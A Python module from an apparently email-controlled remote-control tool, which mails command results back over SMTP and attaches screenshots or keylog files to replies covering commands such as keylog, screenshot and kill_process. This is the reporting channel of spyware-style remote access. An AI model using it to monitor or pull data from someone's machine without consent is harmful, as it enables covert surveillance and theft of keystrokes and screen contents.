import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
import resource_monitor
import variables

smpt_host = variables.smpt_host
smpt_port = variables.smpt_port
USER_EMAIL = variables.USER_EMAIL
USER_PASSWORD = variables.USER_PASSWORD


def main():
    pass


def send_mail_success_execution(recipient_mail, command, filename=None):
    print('\nCommand executed successfully:', command)
    print('Sending email...')
    msg = MIMEMultipart()
    msg['From'] = USER_EMAIL
    msg['To'] = recipient_mail
    msg['Subject'] = "[Result] Remote Control Command"

    if command == 'help':
        response = '''Available commands:
        help
        shutdown
        screenshot
        keylog
        list_processes
        kill_process <pid>'''
    elif command == 'list_processes':
        response = resource_monitor.list_processes()
    else:
        response = ''

    body = f'Executed successfully:\n{command}\n{response}'
    msg.attach(MIMEText(body, 'plain'))
    # if has attachment
    if filename != None:
        # image or plain text (binary or text)
        if filename.lower().endswith('.png'):
            attachment = open(filename, 'rb')
            file = MIMEImage(attachment.read(), name=filename)
        else:
            attachment = open(filename, 'r', encoding='utf-8')
            file = MIMEImage(attachment.read(), 'plain', name=filename)
        attachment.close()
        msg.attach(file)

    try:
        server = smtplib.SMTP(smpt_host, smpt_port)
        server.starttls()
        server.login(USER_EMAIL, USER_PASSWORD)
        text = msg.as_string()
        server.sendmail(USER_EMAIL, recipient_mail, text)
        server.quit()
        print("Email sent successfully")
    except Exception as e:
        print(e)


def send_mail_failure_execution(recipient_mail, command):
    print('Failed to execute:', command)
    print('Sending email...')
    msg = MIMEMultipart()
    msg['From'] = USER_EMAIL
    msg['To'] = recipient_mail
    msg['Subject'] = "[Result] Remote Control Command"
    body = 'Failed to execute: ' + command
    msg.attach(MIMEText(body, 'plain'))
    try:
        server = smtplib.SMTP(smpt_host, smpt_port)
        server.starttls()
        server.login(USER_EMAIL, USER_PASSWORD)
        text = msg.as_string()
        server.sendmail(USER_EMAIL, recipient_mail, text)
        server.quit()
        print("Email sent successfully")
    except Exception as e:
        print(e)


if __name__ == "__main__":
    main()
